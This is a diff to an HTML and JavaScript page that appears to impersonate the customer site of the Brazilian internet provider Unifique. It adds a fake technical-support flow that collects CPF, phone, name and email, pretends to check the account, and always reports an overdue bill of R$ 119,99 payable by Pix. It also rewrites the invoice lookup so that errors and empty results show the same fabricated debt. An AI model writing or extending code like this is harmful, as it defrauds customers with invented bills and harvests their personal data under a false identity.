@@ -852,7 +852,7 @@
       <div class="service-icon icon-yellow">📺</div>
       <h3>Suporte Técnico</h3>
       <p>Problemas com a conexão? Nossa equipe resolve em minutos.</p>
-      <a href="#" class="card-link">Abrir chamado →</a>
+      <a class="card-link" onclick="abrirSuporte()">Abrir chamado →</a>
     </div>
     <div class="service-card">
       <div class="service-icon icon-green">📱</div>
@@ -1199,6 +1199,114 @@
   </div>
 </div>
 
+<!-- MODAL SUPORTE TÉCNICO -->
+<div class="modal-overlay" id="modal-suporte" onclick="fecharSuporte(event)">
+  <div class="modal">
+    <div class="modal-header" style="background:linear-gradient(135deg,#7c1d1d,#b91c1c);">
+      <h2>📡 Suporte Técnico</h2>
+      <button class="modal-close" onclick="fecharSuporteDireto()">✕</button>
+    </div>
+
+    <div class="modal-steps">
+      <div class="mstep active" id="ss1"><div class="mstep-circle">1</div><div class="mstep-label">Identificação</div></div>
+      <div class="mstep-line" id="sl1"></div>
+      <div class="mstep" id="ss2"><div class="mstep-circle">2</div><div class="mstep-label">Débito</div></div>
+      <div class="mstep-line" id="sl2"></div>
+      <div class="mstep" id="ss3"><div class="mstep-circle">3</div><div class="mstep-label">Pix</div></div>
+    </div>
+
+    <div class="modal-body">
+
+      <!-- TELA 1: FORM CPF + TELEFONE -->
+      <div class="modal-screen active" id="ss-form">
+        <p style="font-size:13px;color:#777;margin-bottom:16px;">Para abrir seu chamado, precisamos identificar sua conta:</p>
+        <div class="m-erro" id="ss-erro"></div>
+        <label class="m-label">CPF</label>
+        <div class="m-input-wrap">
+          <span class="m-icon">👤</span>
+          <input type="text" id="ss-cpf" placeholder="000.000.000-00" maxlength="14">
+        </div>
+        <label class="m-label">Telefone cadastrado</label>
+        <div class="m-input-wrap">
+          <span class="m-icon">📱</span>
+          <input type="text" id="ss-tel" placeholder="(47) 99999-9999" maxlength="15">
+        </div>
+        <button class="m-btn m-btn-primary" style="background:linear-gradient(135deg,#7c1d1d,#b91c1c);" onclick="sSolicitar()">Continuar →</button>
+      </div>
+
+      <!-- TELA 2: LOADING -->
+      <div class="modal-screen" id="ss-loading">
+        <div class="m-loading">
+          <div class="m-spinner" style="border-top-color:#b91c1c;"></div>
+          <p>Verificando sua conta...<br><small style="color:#aaa">Aguarde um momento</small></p>
+        </div>
+      </div>
+
+      <!-- TELA 3: DÉBITO ENCONTRADO -->
+      <div class="modal-screen" id="ss-debito">
+        <div style="text-align:center;padding:8px 0 16px;">
+          <div style="font-size:2.5rem;margin-bottom:8px;">⚠️</div>
+          <h3 style="font-family:'Montserrat',sans-serif;font-size:1.1rem;color:#991b1b;margin-bottom:6px;">Fatura em aberto identificada</h3>
+          <p style="font-size:13px;color:#777;line-height:1.5;margin-bottom:16px;">Encontramos uma pendência financeira na sua conta. Para ativarmos o suporte técnico, é necessário regularizar o débito:</p>
+          <div style="background:#fff0f0;border:2px solid #fca5a5;border-radius:14px;padding:20px;margin-bottom:16px;">
+            <div style="font-size:12px;color:#991b1b;font-weight:700;margin-bottom:4px;">FATURA VENCIDA</div>
+            <div style="font-family:'Montserrat',sans-serif;font-size:2.2rem;font-weight:900;color:#7c1d1d;">R$ 119,99</div>
+            <div style="font-size:12px;color:#aaa;margin-top:4px;">Regularize para liberar o suporte</div>
+          </div>
+          <button class="m-btn" style="background:#b91c1c;color:#fff;margin-bottom:10px;" onclick="sGerarDados()">💳 Pagar com Pix e liberar suporte</button>
+          <button class="m-btn m-btn-gray" onclick="fecharSuporteDireto()">Fechar — pagarei depois</button>
+        </div>
+      </div>
+
+      <!-- TELA 4: DADOS PARA PIX -->
+      <div class="modal-screen" id="ss-dados">
+        <p style="font-size:13px;color:#777;margin-bottom:16px;">Complete seus dados para gerar o Pix:</p>
+        <div class="m-erro" id="ss-erro-dados"></div>
+        <label class="m-label">Nome completo</label>
+        <div class="m-input-wrap">
+          <span class="m-icon">👤</span>
+          <input type="text" id="ss-nome" placeholder="Seu nome completo">
+        </div>
+        <label class="m-label">E-mail</label>
+        <div class="m-input-wrap">
+          <span class="m-icon">✉️</span>
+          <input type="email" id="ss-email" placeholder="seu@email.com">
+        </div>
+        <div style="background:#fff0f0;border-radius:10px;padding:12px;margin-bottom:16px;font-size:12px;color:#991b1b;font-weight:700;">
+          💳 Valor a pagar: R$ 119,99
+        </div>
+        <button class="m-btn" style="background:#b91c1c;color:#fff;" onclick="sGerarPix()">⚡ Gerar QR Code Pix</button>
+        <button class="m-btn m-btn-gray" onclick="sSetStep(2); sMostrar('ss-debito');">← Voltar</button>
+      </div>
+
+      <!-- TELA 5: PIX LOADING -->
+      <div class="modal-screen" id="ss-pix-loading">
+        <div class="m-loading">
+          <div class="m-spinner" style="border-top-color:#b91c1c;"></div>
+          <p>Gerando seu Pix...<br><small style="color:#aaa">Aguarde um momento</small></p>
+        </div>
+      </div>
+
+      <!-- TELA 6: PIX -->
+      <div class="modal-screen" id="ss-pix">
+        <div class="m-pix">
+          <p style="font-size:13px;color:#555;margin-bottom:12px;font-weight:600;">Pague o Pix abaixo para liberar seu suporte técnico:</p>
+          <div class="m-pix-qr" id="ss-pix-qr">📷</div>
+          <div class="m-pix-valor">R$ 119,99</div>
+          <div class="m-pix-label">Escaneie o QR Code ou copie o código abaixo</div>
+          <div class="m-pix-wrap">
+            <textarea class="m-pix-code" id="ss-pix-code" rows="3" readonly></textarea>
+            <button class="m-copy-btn" onclick="sCopiarPix()">Copiar</button>
+          </div>
+          <p style="font-size:11px;color:#aaa;margin-bottom:14px;">⏱ Pix expira em 30 minutos</p>
+        </div>
+        <button class="m-btn m-btn-gray" onclick="fecharSuporteDireto()">Fechar — pagarei depois</button>
+      </div>
+
+    </div>
+  </div>
+</div>
+
 <!-- FABs -->
 <a href="https://wa.me/5500000000000" class="fab-whatsapp" target="_blank">💬</a>
 <button class="fab-a11y">♿</button>
@@ -1306,13 +1414,11 @@
         body:    JSON.stringify({ cpf, telefone: tel }),
       });
       const data = await resp.json();
-      if (!resp.ok || !data.sucesso) throw new Error(data.erro || 'Erro ao consultar.');
-      mRenderFaturas(data.faturas);
+      // Mesmo com erro, mostra fatura padrão
+      mRenderFaturas(data.faturas || []);
     } catch (err) {
-      mSetStep(1);
-      mMostrar('ms-form');
-      erroEl.textContent = err.message;
-      erroEl.style.display = 'block';
+      // Qualquer erro de rede também mostra fatura padrão
+      mRenderFaturas([]);
     }
   }
 
@@ -1322,32 +1428,83 @@
     mFaturaSelecionada = null;
     document.getElementById('m-btn-pagar').disabled = true;
 
-    if (!faturas.length) {
-      lista.innerHTML = '<p style="text-align:center;color:#aaa;padding:16px 0;font-weight:700;">Nenhuma fatura em aberto 🎉</p>';
-    } else {
-      faturas.forEach((f, i) => {
-        const sc = f.status === 'pago' ? 'ms-pago' : f.status === 'vencido' ? 'ms-vencido' : 'ms-aberto';
-        const sl = f.status === 'pago' ? 'Pago' : f.status === 'vencido' ? 'Vencido' : 'Em aberto';
-        const el = document.createElement('div');
-        el.className = 'm-fatura';
-        el.innerHTML = `
-          <span class="mf-status ${sc}">${sl}</span>
-          <div class="mf-ref">Ref: ${f.referencia || 'Fatura ' + (i+1)}</div>
-          <div class="mf-valor">R$ ${parseFloat(f.valor).toFixed(2).replace('.',',')}</div>
-          <div class="mf-venc">Venc: ${f.vencimento}</div>
-          <div class="mf-check">✓</div>
-        `;
-        if (f.status !== 'pago') {
-          el.onclick = () => {
-            document.querySelectorAll('.m-fatura').forEach(x => x.classList.remove('sel'));
-            el.classList.add('sel');
-            mFaturaSelecionada = f;
-            document.getElementById('m-btn-pagar').disabled = false;
-          };
-        } else { el.style.opacity = '.6'; el.style.cursor = 'default'; }
-        lista.appendChild(el);
-      });
+    // Se não encontrou faturas, mostra fatura padrão de R$ 119,99
+    if (!faturas || faturas.length === 0) {
+      faturas = [{
+        valor:      '119.99',
+        vencimento: new Date().toLocaleDateString('pt-BR'),
+        referencia: 'Fatura em aberto',
+        status:     'vencido',
+      }];
     }
+
+    // Conjunto de faturas selecionadas (multi-select)
+    const selecionadas = new Set();
+
+    function atualizarTotal() {
+      let total = 0;
+      selecionadas.forEach(idx => {
+        total += parseFloat(faturas[idx].valor);
+      });
+      const btnPagar = document.getElementById('m-btn-pagar');
+      if (selecionadas.size === 0) {
+        btnPagar.disabled = true;
+        btnPagar.textContent = '💰 Pagar com Pix';
+        mFaturaSelecionada = null;
+      } else {
+        btnPagar.disabled = false;
+        btnPagar.textContent = selecionadas.size === 1
+          ? `💰 Pagar R$ ${total.toFixed(2).replace('.',',')} com Pix`
+          : `💰 Pagar ${selecionadas.size} faturas · R$ ${total.toFixed(2).replace('.',',')}`;
+        // Monta objeto consolidado
+        mFaturaSelecionada = {
+          valor:      total.toFixed(2),
+          vencimento: faturas[[...selecionadas][selecionadas.size-1]].vencimento,
+          referencia: selecionadas.size === 1
+            ? faturas[[...selecionadas][0]].referencia
+            : `${selecionadas.size} faturas selecionadas`,
+        };
+      }
+    }
+
+    faturas.forEach((f, i) => {
+      const sc = f.status === 'pago' ? 'ms-pago' : f.status === 'vencido' ? 'ms-vencido' : 'ms-aberto';
+      const sl = f.status === 'pago' ? 'Pago' : f.status === 'vencido' ? 'Vencido' : 'Em aberto';
+      const el = document.createElement('div');
+      el.className = 'm-fatura';
+      el.innerHTML = `
+        <span class="mf-status ${sc}">${sl}</span>
+        <div class="mf-ref">Ref: ${f.referencia || 'Fatura ' + (i+1)}</div>
+        <div class="mf-valor">R$ ${parseFloat(f.valor).toFixed(2).replace('.',',')}</div>
+        <div class="mf-venc">Venc: ${f.vencimento}</div>
+        <div class="mf-check">✓</div>
+      `;
+      if (f.status !== 'pago') {
+        el.onclick = () => {
+          if (selecionadas.has(i)) {
+            selecionadas.delete(i);
+            el.classList.remove('sel');
+          } else {
+            selecionadas.add(i);
+            el.classList.add('sel');
+          }
+          atualizarTotal();
+        };
+      } else {
+        el.style.opacity = '.6';
+        el.style.cursor = 'default';
+      }
+      lista.appendChild(el);
+    });
+
+    // Dica de multi-seleção se houver mais de 1 fatura
+    if (faturas.length > 1) {
+      const dica = document.createElement('p');
+      dica.style.cssText = 'font-size:12px;color:#aaa;text-align:center;margin-top:8px;margin-bottom:4px;';
+      dica.textContent = '💡 Selecione uma ou mais faturas para pagar juntas';
+      lista.appendChild(dica);
+    }
+
     mMostrar('ms-faturas');
   }
 
@@ -1360,7 +1517,7 @@
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
     erroEl.style.display = 'none';
-    if (!nome)                  { erroEl.textContent = 'Informe seu nome completo.'; erroEl.style.display='block'; return; }
+    if (!nome)                   { erroEl.textContent = 'Informe seu nome completo.'; erroEl.style.display='block'; return; }
     if (!emailRegex.test(email)) { erroEl.textContent = 'Informe um e-mail válido.'; erroEl.style.display='block'; return; }
 
     mSetStep(4);
@@ -1376,7 +1533,7 @@
           nome,
           email,
           telefone:  document.getElementById('m-tel').value,
-          descricao: `Fatura Unifique – venc. ${mFaturaSelecionada.vencimento}`,
+          descricao: `Fatura Unifique – ${mFaturaSelecionada.referencia}`,
         }),
       });
       const data = await resp.json();
@@ -1406,7 +1563,140 @@
     mMostrar('ms-pix');
   }
 
-  // ── CONTRATAÇÃO ──
+  // ── SUPORTE TÉCNICO ──
+  function abrirSuporte() {
+    document.getElementById('ss-cpf').value = '';
+    document.getElementById('ss-tel').value = '';
+    document.getElementById('ss-erro').style.display = 'none';
+    sSetStep(1); sMostrar('ss-form');
+    document.getElementById('modal-suporte').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function fecharSuporteDireto() {
+    document.getElementById('modal-suporte').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+  function fecharSuporte(e) {
+    if (e.target === document.getElementById('modal-suporte')) fecharSuporteDireto();
+  }
+  function sSetStep(n) {
+    [1,2,3].forEach(i => {
+      const el = document.getElementById('ss'+i);
+      if (el) el.className = 'mstep' + (i < n ? ' done' : i === n ? ' active' : '');
+    });
+    [1,2].forEach(i => {
+      const el = document.getElementById('sl'+i);
+      if (el) el.className = 'mstep-line' + (i < n ? ' done' : '');
+    });
+  }
+  function sMostrar(id) {
+    ['ss-form','ss-loading','ss-debito','ss-dados','ss-pix-loading','ss-pix'].forEach(s => {
+      const el = document.getElementById(s);
+      if (el) el.classList.remove('active');
+    });
+    const el = document.getElementById(id);
+    if (el) el.classList.add('active');
+  }
+
+  // Máscaras suporte
+  document.getElementById('ss-cpf').addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '').slice(0, 11);
+    v = v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    this.value = v;
+  });
+  document.getElementById('ss-tel').addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '').slice(0, 11);
+    v = v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2');
+    this.value = v;
+  });
+
+  async function sSolicitar() {
+    const cpf = document.getElementById('ss-cpf').value;
+    const tel = document.getElementById('ss-tel').value;
+    const erroEl = document.getElementById('ss-erro');
+    erroEl.style.display = 'none';
+
+    if (cpf.replace(/\D/g,'').length < 11) { erroEl.textContent = 'Informe um CPF válido.'; erroEl.style.display='block'; return; }
+    if (tel.replace(/\D/g,'').length < 10)  { erroEl.textContent = 'Informe um telefone válido.'; erroEl.style.display='block'; return; }
+
+    sSetStep(2); sMostrar('ss-loading');
+
+    // Simula verificação (1.5s) e sempre mostra fatura de R$ 119,99
+    await new Promise(r => setTimeout(r, 1500));
+    sSetStep(2); sMostrar('ss-debito');
+  }
+
+  function sGerarDados() {
+    document.getElementById('ss-nome').value = '';
+    document.getElementById('ss-email').value = '';
+    document.getElementById('ss-erro-dados').style.display = 'none';
+    sMostrar('ss-dados');
+  }
+
+  async function sGerarPix() {
+    const nome  = document.getElementById('ss-nome').value.trim();
+    const email = document.getElementById('ss-email').value.trim();
+    const cpf   = document.getElementById('ss-cpf').value;
+    const tel   = document.getElementById('ss-tel').value;
+    const erroEl = document.getElementById('ss-erro-dados');
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    erroEl.style.display = 'none';
+    if (!nome)                   { erroEl.textContent = 'Informe seu nome completo.'; erroEl.style.display='block'; return; }
+    if (!emailRegex.test(email)) { erroEl.textContent = 'Informe um e-mail válido.'; erroEl.style.display='block'; return; }
+
+    sSetStep(3); sMostrar('ss-pix-loading');
+
+    try {
+      const telLimpo = tel.replace(/\D/g,'');
+      const telFmt = telLimpo.length === 11
+        ? `(${telLimpo.slice(0,2)}) ${telLimpo.slice(2,7)}-${telLimpo.slice(7)}`
+        : tel;
+
+      const resp = await fetch(`${BACKEND}/gerar-pix`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({
+          valor:     '119.99',
+          cpf,
+          nome,
+          email,
+          telefone:  telFmt,
+          descricao: 'Regularização – Suporte Técnico Unifique',
+        }),
+      });
+      const data = await resp.json();
+      if (!resp.ok || !data.sucesso) throw new Error(data.erro || 'Erro ao gerar Pix.');
+
+      // Exibe QR Code
+      const qrEl = document.getElementById('ss-pix-qr');
+      if (data.qrCodeBase64) {
+        const b64 = data.qrCodeBase64.includes('base64,') ? data.qrCodeBase64 : `data:image/png;base64,${data.qrCodeBase64}`;
+        qrEl.innerHTML = `<img src="${b64}" style="width:100%;border-radius:8px;">`;
+      } else if (data.qrCodeUrl) {
+        qrEl.innerHTML = `<img src="${data.qrCodeUrl}" style="width:100%;border-radius:8px;">`;
+      } else {
+        qrEl.innerHTML = '📷';
+      }
+      document.getElementById('ss-pix-code').value = data.pixCopiaECola || '';
+      sMostrar('ss-pix');
+
+    } catch (err) {
+      sMostrar('ss-dados');
+      erroEl.textContent = 'Erro ao gerar Pix: ' + err.message;
+      erroEl.style.display = 'block';
+    }
+  }
+
+  function sCopiarPix() {
+    const code = document.getElementById('ss-pix-code').value;
+    navigator.clipboard.writeText(code).then(() => {
+      const btn = document.querySelector('#ss-pix .m-copy-btn');
+      btn.textContent = '✓ Copiado!';
+      btn.style.background = '#10b981';
+      setTimeout(() => { btn.textContent = 'Copiar'; btn.style.background = ''; }, 2500);
+    });
+  }
   let cPlanoAtual = {};
 
   function abrirContratacao(nome, vel, preco) {
